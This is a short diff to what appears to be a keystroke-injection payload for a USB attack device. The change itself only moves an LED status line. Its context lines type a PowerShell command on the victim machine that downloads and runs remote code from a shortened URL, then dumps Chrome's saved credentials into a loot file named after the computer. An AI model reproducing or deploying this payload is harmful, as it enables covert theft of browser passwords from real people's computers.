@@ -28,5 +28,6 @@ Q ENTER
 Q DELAY 100
 Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nea8tb\'\)\; Get-ChromeCreds \| Out-File \$Bunny\\loot\\ChromeCreds\\Chrome_\$env:computername.txt
 Q ENTER
-LED R B 200
 sync
+LED R B 200
+
